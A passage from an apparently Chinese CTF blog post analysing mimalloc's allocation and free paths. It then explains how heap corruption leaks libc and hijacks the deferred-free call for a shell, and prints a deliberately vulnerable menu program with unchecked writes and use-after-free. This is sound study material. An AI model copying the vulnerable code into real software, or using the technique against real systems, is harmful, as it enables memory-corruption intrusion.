MI_STAT    </span></span><br><span class="line">    count++;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0. collect freed blocks by us and other threads</span></span><br><span class="line">    _mi_page_free_collect(page, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. if the page contains free blocks, we are done</span></span><br><span class="line">    <span class="keyword">if</span> (mi_page_immediate_available(page)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;  <span class="comment">// pick this one</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Try to extend</span></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;capacity &lt; page-&gt;reserved) &#123;</span><br><span class="line">      mi_page_extend_free(heap, page, heap-&gt;tld);</span><br><span class="line">      mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. If the page is completely full, move it to the `mi_pages_full`</span></span><br><span class="line">    <span class="comment">// queue so we don&#x27;t visit long-lived pages too often.</span></span><br><span class="line">    mi_assert_internal(!mi_page_is_in_full(page) &amp;&amp; !mi_page_immediate_available(page));</span><br><span class="line">    mi_page_to_full(page, pq);</span><br><span class="line"></span><br><span class="line">    page = next;</span><br><span class="line">  &#125; <span class="comment">// for each page</span></span><br><span class="line"></span><br><span class="line">  mi_heap_stat_counter_increase(heap, searches, count);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (page == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    _mi_heap_collect_retired(heap, <span class="literal">false</span>); <span class="comment">// perhaps make a page available?</span></span><br><span class="line">    page = mi_page_fresh(heap, pq);</span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span> &amp;&amp; first_try) &#123;</span><br><span class="line">      <span class="comment">// out-of-memory _or_ an abandoned page with free blocks was reclaimed, try once again</span></span><br><span class="line">      page = mi_page_queue_find_free_ex(heap, pq, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    mi_assert(pq-&gt;first == page);</span><br><span class="line">    page-&gt;retire_expire = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(page == <span class="literal">NULL</span> || mi_page_immediate_available(page));</span><br><span class="line">  <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果page为0  那么就会跳过while循环 进入if分支 调用_mi_heap_collect_retired函数</p><p>该函数就是遍历heap-&gt;page_retired_min<code>到</code>heap-&gt;page_retired_max之间的所有页面队列 具体的这里先不讲</p><p>接着调用mi_page_fresh函数来初始化一个新的内存页面 这里返回的值实际上就是位于segment首地址处的page info信息</p><p>如果page还是为0的话 就再次调用mi_page_queue_find_free_ex函数 </p><p>如果page在while循环中获取到了 就设置page为不可回收</p><p>在最后进行了断言判断 page要么可利用 要么为0</p><h3 id="mi-page-free-collect"><a href="#mi-page-free-collect" class="headerlink" title="_mi_page_free_collect"></a>_mi_page_free_collect</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _mi_page_free_collect(<span class="type">mi_page_t</span>* page, <span class="type">bool</span> force) &#123;</span><br><span class="line">  mi_assert_internal(page!=<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect the thread free list</span></span><br><span class="line">  <span class="keyword">if</span> (force || mi_page_thread_free(page) != <span class="literal">NULL</span>) &#123;  <span class="comment">// quick test to avoid an atomic operation</span></span><br><span class="line">    _mi_page_thread_free_collect(page);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and the local free list</span></span><br><span class="line">  <span class="keyword">if</span> (page-&gt;local_free != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(page-&gt;<span class="built_in">free</span> == <span class="literal">NULL</span>)</span> &#123;</span><br><span class="line">      <span class="comment">// usual case</span></span><br><span class="line">      page-&gt;<span class="built_in">free</span> = page-&gt;local_free;</span><br><span class="line">      page-&gt;local_free = <span class="literal">NULL</span>;</span><br><span class="line">      page-&gt;free_is_zero = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (force) &#123;</span><br><span class="line">      <span class="comment">// append -- only on shutdown (force) as this is a linear operation</span></span><br><span class="line">      <span class="type">mi_block_t</span>* tail = page-&gt;local_free;</span><br><span class="line">      <span class="type">mi_block_t</span>* next;</span><br><span class="line">      <span class="keyword">while</span> ((next = mi_block_next(page, tail)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail = next;</span><br><span class="line">      &#125;</span><br><span class="line">      mi_block_set_next(page, tail, page-&gt;<span class="built_in">free</span>);</span><br><span class="line">      page-&gt;<span class="built_in">free</span> = page-&gt;local_free;</span><br><span class="line">      page-&gt;local_free = <span class="literal">NULL</span>;</span><br><span class="line">      page-&gt;free_is_zero = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mi_assert_internal(!force || page-&gt;local_free == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始首先收集thread_free中的内存块 接下来收集free和local_free的内存块 这里来分析一下逻辑</p><p>如果loacl_free链表不为空 进入if分支 检测free链表是否为空 如果为空 则将local_free链表移到free链表中 同时没有做任何的检查 也就意味着这里我们可以做到任意地址申请 只需要想办法覆盖local_free链表</p><h3 id="mi-heap-malloc-small-zero"><a href="#mi-heap-malloc-small-zero" class="headerlink" title="mi_heap_malloc_small_zero"></a>mi_heap_malloc_small_zero</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_heap_malloc_small_zero</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero)</span> mi_attr_noexcept &#123;</span><br><span class="line">  mi_assert(heap != <span class="literal">NULL</span>);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uintptr_t</span> tid = _mi_thread_id();</span><br><span class="line">  mi_assert(heap-&gt;thread_id == <span class="number">0</span> || heap-&gt;thread_id == tid); <span class="comment">// heaps are thread local</span></span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  mi_assert(size &lt;= MI_SMALL_SIZE_MAX);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> (MI_PADDING)</span></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123; size = <span class="keyword">sizeof</span>(<span class="type">void</span>*); &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = _mi_heap_get_free_small_page(heap, size + MI_PADDING_SIZE);</span><br><span class="line">  <span class="type">void</span>* <span class="type">const</span> p = _mi_page_malloc(heap, page, size + MI_PADDING_SIZE, zero);  </span><br><span class="line">  mi_track_malloc(p,size,zero);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_STAT&gt;1</span></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125;</span><br><span class="line">    mi_heap_stat_increase(heap, <span class="built_in">malloc</span>, mi_usable_size(p));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; zero) &#123;</span><br><span class="line">    mi_assert_expensive(mi_mem_is_zero(p, size));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑还是比较简单的 就是通过_mi_heap_get_free_small_page函数获取到适合small内存块的page 随后调用 _mi_page_malloc来申请内存块 剩余的部分就是一些check和计数信息的更新</p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>那么到这里我们可以做一个大概的总结 首先进入mi_malloc函数 对于要申请的内存块的size进行了判断 如果小于0x400则进入 mi_heap_malloc_small_zero函数 如果大于0x400则进入_mi_malloc_generic函数</p><p>如果是进入mi_heap_malloc_small_zero函数 那么会调用 _mi_page_malloc来获取内存块</p><p>该函数通过page的free链表来获取相应的内存块</p><p>如果是_mi_malloc_generic函数 那么会调用mi_find_page函数来寻找可用的page 该函数继续索引到mi_find_free_page函数来寻找page</p><p>根据是否开启了debug模式来调用_mi_page_free_collect函数 如果开启了debug模式 就不会预编译对应的else分支 如果关闭了debug模式 就会进入该函数  一开始先根据force参数或者是mi_page_thread_free函数的返回值来决定是否要调用thread_free  接着检查local_free链表 根据free链表是否为空 来考虑是否要把local_free链表存放到free链表中</p><p>两种情况最后都是进入了mi_page_queue_find_free_ex函数 遍历retire链表 如果没有空闲的page就初始化一个新的page 如果初始化失败 就再次调用mi_page_queue_find_free_ex函数</p><h3 id="mi-free"><a href="#mi-free" class="headerlink" title="mi_free"></a>mi_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mi_free</span><span class="params">(<span class="type">void</span>* p)</span> mi_attr_noexcept</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(p == <span class="literal">NULL</span>)</span> <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">mi_segment_t</span>* <span class="type">const</span> segment = mi_checked_ptr_segment(p,<span class="string">&quot;mi_free&quot;</span>);</span><br><span class="line">  <span class="type">const</span> <span class="type">bool</span>          is_local= (_mi_prim_thread_id() == mi_atomic_load_relaxed(&amp;segment-&gt;thread_id));</span><br><span class="line">  <span class="type">mi_page_t</span>* <span class="type">const</span>    page    = _mi_segment_page_of(segment, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(is_local)</span> &#123;                       <span class="comment">// thread-local free?</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(page-&gt;flags.full_aligned == <span class="number">0</span>)</span>  <span class="comment">// and it is not a full page (full pages need to move from the full bin), nor has aligned blocks (aligned blocks need to be unaligned)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">mi_block_t</span>* <span class="type">const</span> block = (<span class="type">mi_block_t</span>*)p;</span><br><span class="line">      <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_check_is_double_free(page, block))</span> <span class="keyword">return</span>;</span><br><span class="line">      mi_check_padding(page, block);</span><br><span class="line">      mi_stat_free(page, block);</span><br><span class="line">      <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED  &amp;&amp; !MI_TSAN</span></span><br><span class="line">      <span class="built_in">memset</span>(block, MI_DEBUG_FREED, mi_page_block_size(page));</span><br><span class="line">      <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      mi_track_free_size(p, mi_page_usable_size_of(page,block)); <span class="comment">// faster then mi_usable_size as we already know the page and that p is unaligned</span></span><br><span class="line">      mi_block_set_next(page, block, page-&gt;local_free);</span><br><span class="line">      page-&gt;local_free = block;</span><br><span class="line">      <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(--page-&gt;used == <span class="number">0</span>)</span> &#123;   <span class="comment">// using this expression generates better code than: page-&gt;used--; if (mi_page_all_free(page))</span></span><br><span class="line">        _mi_page_retire(page);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// page is full or contains (inner) aligned blocks; use generic path</span></span><br><span class="line">      _mi_free_generic(segment, page, <span class="literal">true</span>, p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// not thread-local; use generic path</span></span><br><span class="line">    _mi_free_generic(segment, page, <span class="literal">false</span>, p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始调用相关函数获取内存块对应的page和segment</p><p>接下来对于是否为同线程的内存块进行了判断 如果是其他线程的内存块 直接调用_mi_free_generic函数进行额外的情况</p><p>page-&gt;flags.full_aligned成员是用来查看该page是否需要内存对齐的 如果申请的大小刚好等于页的大小 那么内部就不用进行内存对齐 释放也直接调用_mi_free_generic函数来进行</p><p>接着检查了是否存在double free的情况(这里吐槽一下 我觉得这个check太仁慈了 就算检测出来 竟然也没有直接终止进程 你说就输出个报错有啥用阿哥 甚至你不开debug模式都不会进行double free检测)</p><p>mi_check_padding函数主要是调试模式下 会出申请padding的内存 用来存放字节 供检测是否出现内存越界的情况 没有开启debug模式的话 直接就可以忽略掉这个函数</p><p>mi_stat_free是用来统计free内存块的信息</p><p>可以看到最后   是更新了page的local_free链表  而非free链表 也就是说释放的内存块会优先进入local_free链表</p><p>接着根据page-&gt;used的值来判断page是否都是空闲内存块 如果是 则retire整个page</p><h3 id="mi-check-is-double-free"><a href="#mi-check-is-double-free" class="headerlink" title="mi_check_is_double_free"></a>mi_check_is_double_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mi_track_page(page,access)  &#123; size_t psize; void* pstart = _mi_page_start(_mi_page_segment(page),page,&amp;psize); mi_track_mem_##access( pstart, psize); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">mi_check_is_double_free</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> is_double_free = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">mi_block_t</span>* n = mi_block_nextx(page, block, page-&gt;keys); <span class="comment">// pretend it is freed, and get the decoded first field</span></span><br><span class="line">  <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)n &amp; (MI_INTPTR_SIZE<span class="number">-1</span>))==<span class="number">0</span> &amp;&amp;  <span class="comment">// quick check: aligned pointer?</span></span><br><span class="line">      (n==<span class="literal">NULL</span> || mi_is_in_same_page(block, n))) <span class="comment">// quick check: in same page or NULL?</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Suspicous: decoded value a in block is in the same page (or NULL) -- maybe a double free?</span></span><br><span class="line">    <span class="comment">// (continue in separate function to improve code generation)</span></span><br><span class="line">    is_double_free = mi_check_is_double_freex(page, block);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> is_double_free;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">mi_check_is_double_free</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  MI_UNUSED(page);</span><br><span class="line">  MI_UNUSED(block);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过mi_block_nextx函数来获取内存块的next成员 如果为0或者和内存块位于同一个page 那么就会进入mi_check_is_double_freex函数进行更加详细的check 如果不开启debug模式的话 不会进行double free检测</p><h3 id="mi-check-is-double-freex"><a href="#mi-check-is-double-freex" class="headerlink" title="mi_check_is_double_freex"></a>mi_check_is_double_freex</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mi_decl_noinline <span class="type">bool</span> <span class="title function_">mi_check_is_double_freex</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  <span class="comment">// The decoded value is in the same page (or NULL).</span></span><br><span class="line">  <span class="comment">// Walk the free lists to verify positively if it is already freed</span></span><br><span class="line">  <span class="keyword">if</span> (mi_list_contains(page, page-&gt;<span class="built_in">free</span>, block) ||</span><br><span class="line">      mi_list_contains(page, page-&gt;local_free, block) ||</span><br><span class="line">      mi_list_contains(page, mi_page_thread_free(page), block))</span><br><span class="line">  &#123;</span><br><span class="line">    _mi_error_message(EAGAIN, <span class="string">&quot;double free detected of block %p with size %zu\n&quot;</span>, block, mi_page_block_size(page));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过遍历page的三个链表来查找内存块是否已经被释放过了</p><p>相对来说比较好绕过 只要更改链表头的next成员 就可以让链表索引不到已经被释放过的内存块</p><h3 id="mi-free-generic"><a href="#mi-free-generic" class="headerlink" title="_mi_free_generic"></a>_mi_free_generic</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> mi_decl_noinline _mi_free_generic(<span class="type">const</span> <span class="type">mi_segment_t</span>* segment, <span class="type">mi_page_t</span>* page, <span class="type">bool</span> is_local, <span class="type">void</span>* p) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="type">mi_block_t</span>* <span class="type">const</span> block = (mi_page_has_aligned(page) ? _mi_page_ptr_unalign(segment, page, p) : (<span class="type">mi_block_t</span>*)p);</span><br><span class="line">  mi_stat_free(page, block);    <span class="comment">// stat_free may access the padding</span></span><br><span class="line">  mi_track_free_size(block, mi_page_usable_size_of(page,block));</span><br><span class="line">  _mi_free_block(page, is_local, block);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始先进行了内存对齐的检测 随后就是老一套的内存块信息的记录</p><p>随后调用_mi_free_block函数释放内存块</p><h3 id="mi-free-block"><a href="#mi-free-block" class="headerlink" title="_mi_free_block"></a>_mi_free_block</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> _mi_free_block(<span class="type">mi_page_t</span>* page, <span class="type">bool</span> local, <span class="type">mi_block_t</span>* block)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// and push it on the free list</span></span><br><span class="line">  <span class="comment">//const size_t bsize = mi_page_block_size(page);</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(local)</span> &#123;</span><br><span class="line">    <span class="comment">// owning thread can free a block directly</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_check_is_double_free(page, block))</span> <span class="keyword">return</span>;</span><br><span class="line">    mi_check_padding(page, block);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN</span></span><br><span class="line">    <span class="keyword">if</span> (!mi_page_is_huge(page)) &#123;   <span class="comment">// huge page content may be already decommitted</span></span><br><span class="line">      <span class="built_in">memset</span>(block, MI_DEBUG_FREED, mi_page_block_size(page));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    mi_block_set_next(page, block, page-&gt;local_free);</span><br><span class="line">    page-&gt;local_free = block;</span><br><span class="line">    page-&gt;used--;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_page_all_free(page))</span> &#123;</span><br><span class="line">      _mi_page_retire(page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> mi_unlikely(mi_page_is_in_full(page)) &#123;</span><br><span class="line">      _mi_page_unfull(page);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    _mi_free_block_mt(page,block);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然是先进行了内存越界和double free的检测 同时根据是否开启了debug模式 来决定是否要调用memset函数清空内存块的内容</p><p>随后就是更新local_free链表和used的值 接着检查是否要释放整个page 或者是当前page是否已经成为满页 如果是满页则从满页列表中移除</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>总结一下释放 实际上就是先进行没啥软用的double free检查 然后根据要释放的内存块是否就是整个page 来决定要不要用_mi_free_generic函数来释放</p><p>释放完的话 是加入到local_free链表 并且used的值会减少 相对来说逻辑还是比较简单的</p><h2 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h2><h3 id="泄露libc基址和任意写"><a href="#泄露libc基址和任意写" class="headerlink" title="泄露libc基址和任意写"></a>泄露libc基址和任意写</h3><p>在泄露libc基址上同ptmalloc不一样 因为供用户申请的内存块就算被释放后 也不会根据大小进入bin中 从而在fd域或者bk域写入libc地址 我们在获得一个内存块后 只能获得其next域的下一个内存块的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021534229.png" title="image-20230802153413131" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021534229.png" alt="image-20230802153413131"></a></p><p>而在获得内存块后 我们就可以计算得到page的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021535806.png" title="image-20230802153526770" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021535806.png" alt="image-20230802153526770"></a></p><p>page中就存放着libc地址 经过偏移计算即可得到libc基址</p><p>问题在于如何构造任意写 经过上面的源码分析我们可以得知 内存块的申请是优先从free链表中获取的 如果我们拥有溢出的机会 修改下一个内存块的next域 是不是就可以实现任意地址申请</p><p>同时还需要注意一点 由于mimalloc内存地址的特殊性 如果我们申请的内存块过小 就会导致低字节处\x00 截断输出 进而妨碍我们泄露内存块地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021538342.png" title="image-20230802153814311" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021538342.png" alt="image-20230802153814311"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021544240.png" title="image-20230802154451205" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021544240.png" alt="image-20230802154451205"></a></p><p>可以看到此时free链表中已经写入了我们想要用来泄露libc地址的fake chunk</p><p>此时我们再次申请出同样size的两个内存块 打印第二个内存块的内容 就可以得到_mi_heap_main的地址 从而泄露libc基址</p><p>同时要注意一下 libc基址和libmimalloc基址是不一样的</p><h4 id="2-34以上的libc版本"><a href="#2-34以上的libc版本" class="headerlink" title="2.34以上的libc版本"></a>2.34以上的libc版本</h4><p>由于2.34以上的版本的tls结构体的偏移进行了随机化 所以还需要进行爆破一个字节才能得到正确的libc的基址</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>回顾一下mi_malloc_generic函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call potential deferred free routines</span></span><br><span class="line">  _mi_deferred_free(heap, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>会发现其调用了这个函数 当时我的分析是将标记释放的内存块加入到延迟释放链表中</p><p>而在ida的汇编代码中你可以看到 其是通过call指令来调用的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604632.png" title="image-20230802160433594" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604632.png" alt="image-20230802160433594"></a></p><p>偏偏这个地址还是可写的  所以我们可以通过往这个地址写入system函数 从而进行任意函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604794.png" title="image-20230802160454759" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604794.png" alt="image-20230802160454759"></a></p><p>但是很快你会发现我们并没有办法控制rdi寄存器</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021727558.png" title="image-20230802172730420" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021727558.png" alt="image-20230802172730420"></a></p><p>但是可以控制rdx寄存器 联想ptmalloc我们是如何实现的orw 就会想到setcontext这一手法</p><h3 id="调试题目和脚本"><a href="#调试题目和脚本" class="headerlink" title="调试题目和脚本"></a>调试题目和脚本</h3><p>需要的可以自行下载或者编译</p><p>链接: <a href="https://pan.baidu.com/s/1R6jhSAod4g8RQZT9tQSg_g?pwd=d193">https://pan.baidu.com/s/1R6jhSAod4g8RQZT9tQSg_g?pwd=d193</a> 提取码: d193 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;mimalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.mi_malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.mi_free&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_read</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size :&quot;</span>);</span><br><span class="line">    size = my_read();</span><br><span class="line">    chunk_size[count] = size;</span><br><span class="line">    chunk_ptr[count] = mi_malloc(size);</span><br><span class="line">    count ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    mi_free(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> size = my_read();</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice = my_read();</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span 